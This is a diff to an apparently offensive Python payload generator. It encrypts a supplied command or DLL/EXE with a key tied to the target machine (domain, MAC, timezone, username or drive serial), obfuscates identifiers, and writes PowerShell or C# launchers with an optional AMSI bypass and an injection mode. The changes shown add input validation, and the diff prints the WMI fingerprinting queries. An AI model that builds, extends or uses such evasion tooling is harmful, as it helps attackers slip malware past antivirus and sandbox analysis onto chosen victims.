@@ -39,7 +39,8 @@ parser_ps.add_argument('--driveserial', '-sn', help='C: drive serial number')
 parser_ps.add_argument('--payload', '-x', help='Command to run')
 parser_ps.add_argument('--payload_file', help='File containing payload to run')
 parser_ps.add_argument('--exitcmd', '-ec', default="exit", help='PS code or command to run if the environment check fails')
-parser_ps.add_argument('--amsi','-a', action='store_true', help='Use AMSI bypassing (Only use if running Windows 10+)')
+#Requires manual implementation in "psh.py"
+parser_ps.add_argument('--amsi','-a', action='store_true', help='Use integrated AMSI bypass (Only use if running Windows 10+)')
 
 # Create the parser for the C# process creation method
 parser_cs_ps = subparsers.add_parser('cs-process', help='C# Process help')
@@ -49,7 +50,7 @@ parser_cs_ps.add_argument('--computer', '-c', help='Computer name to check for')
 parser_cs_ps.add_argument('--timezone', '-tz', help='System timezone (format: UTC-05, UTC+02')
 parser_cs_ps.add_argument('--driveserial', '-sn', help='C: drive serial number (Note: only works on physical systems)')
 parser_cs_ps.add_argument('--volumeserial', '-vsn', help='C: drive volume serial number (Note: only works on physical systems)')
-parser_cs_ps.add_argument('--payload', '-x', help='Command to run')
+parser_cs_ps.add_argument('--payload', '-x', help='C# one-liner to run')
 parser_cs_ps.add_argument('--payload_file', help='File containing payload to run')
 
 # Create the parser for the CS PE injection method
@@ -60,7 +61,7 @@ parser_cs_inj.add_argument('--computer', '-c', help='Computer name to check for'
 parser_cs_inj.add_argument('--timezone', '-tz', help='System timezone (format: UTC-05, UTC+02')
 parser_cs_inj.add_argument('--driveserial', '-sn', help='C: drive serial number (Note: only works on physical systems)')
 parser_cs_inj.add_argument('--volumeserial', '-vsn', help='C: drive volume serial number (Note: only works on physical systems)')
-parser_cs_inj.add_argument('--payload_file', help='DLL/EXE to be loaded on decryption')
+parser_cs_inj.add_argument('--payload_file', help='DLL/EXE to be loaded on decryption', required=True)
 
 # Parse  argument lists
 args = parser.parse_args()
@@ -76,23 +77,29 @@ if len(sys.argv) == 1:
 try:
     # PowerShell environmental keying
     if sys.argv[1] == 'ps':
+        if not (args.payload or args.payload_file):
+            parser_ps.print_help()
+            sys.exit(1)
+        if not (args.domain or args.joined or args.mac or args.timezone or args.username or args.driveserial):
+            parser_ps.print_help()
+            sys.exit(1)
         if args.domain:
             key = args.domain
             query = '(Get-WmiObject -Class Win32_ComputerSystem).Domain'
-        if args.joined:
+        elif args.joined:
             key = "True"  # store_true used to make this check that the target is domain-joined
             query = '(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain'
-        if args.mac:
+        elif args.mac:
             key = args.mac
             # This needs more testing, especially on devices with multiple NICs
             query = '(Get-WmiObject win32_networkadapterconfiguration | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress).substring(0,8)'
-        if args.timezone:
+        elif args.timezone:
             key = args.timezone
             query = '''"{0:'UTC'zz}" -f (get-date) -replace(0,"")'''
-        if args.username:
+        elif args.username:
             key = args.username
             query = "((Get-WmiObject -Class Win32_ComputerSystem).username).split('\\')[1]"
-        if args.driveserial:
+        elif args.driveserial:
             key = args.driveserial
             query = "(Get-WmiObject win32_physicalmedia | ft SerialNumber -HideTableHeaders | Select -First 3 | Out-String).Trim()"
 
@@ -107,7 +114,7 @@ try:
         encrypted = Encrypter.encrypt1(payload, key)
         # Obfuscate variable and function names
         Obfuscator = Obfuscator()
-        varKey, varCtr, varBytes, varAesManaged, varencryptedStringWithIV, varUnencryptedData, varDecryptor, varLauncher, funcCreateAesManagedObject, funcDecryptString, sta, stb, stc, std = Obfuscator.varobfs() #a, b, c, d are not used, but needed to allow cs-inject to run properly
+        varhWindow, varKey, varCtr, varBytes, varAesManaged, varencryptedStringWithIV, varUnencryptedData, varDecryptor, varLauncher, funcCreateAesManagedObject, funcDecryptString, sta, stb, stc, std = Obfuscator.varobfs() #a, b, c, d are not used, but needed to allow cs-inject to run properly
         varKey = '$' + varKey
         varCtr = '$' + varCtr
         varBytes = '$' + varBytes
@@ -120,8 +127,15 @@ try:
         pshTemplate.pshTemplate(encrypted, varKey, varCtr, varBytes, varAesManaged, varencryptedStringWithIV, \
                                 varUnencryptedData, varDecryptor, varLauncher, funcCreateAesManagedObject, \
                                 funcDecryptString, query, args.amsi, args.exitcmd)
+        
 
     if sys.argv[1] == 'cs-inject':
+        if not (args.payload_file):
+            parser_cs_inj.print_help()
+            sys.exit(1)
+        if not (args.domain or args.user or args.computer or args.driveserial or args.volumeserial):
+            parser_cs_inj.print_help()
+            sys.exit(1)
         if args.domain:
             key = args.domain
         elif args.user:
@@ -185,6 +199,12 @@ try:
         print('[+] CS File Saved as cs-inject.cs')
 
     if sys.argv[1] == 'cs-process':
+        if not (args.payload or args.payload_file):
+            parser_cs_ps.print_help()
+            sys.exit(1)
+        if not (args.domain or args.user or args.computer or args.driveserial or args.volumeserial):
+            parser_cs_ps.print_help()
+            sys.exit(1)
         if args.domain:
             key = args.domain
         elif args.user:
